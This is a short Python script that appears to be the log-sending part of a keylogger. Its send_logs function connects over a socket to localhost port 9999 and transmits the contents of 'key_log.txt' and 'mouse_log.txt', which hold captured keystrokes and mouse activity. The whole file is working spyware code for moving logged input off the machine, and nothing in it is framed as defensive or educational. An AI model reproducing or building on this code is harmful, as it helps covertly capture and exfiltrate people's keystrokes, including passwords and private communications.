import socket
import sys

files = ['key_log.txt', 'mouse_log.txt']

def send_logs():
	s = socket.socket()
	s.connect(("localhost",9999))

	for filename in files:
		f = open (filename, "rb")
		l = f.read(1024)
		s.send(l)

	s.close()
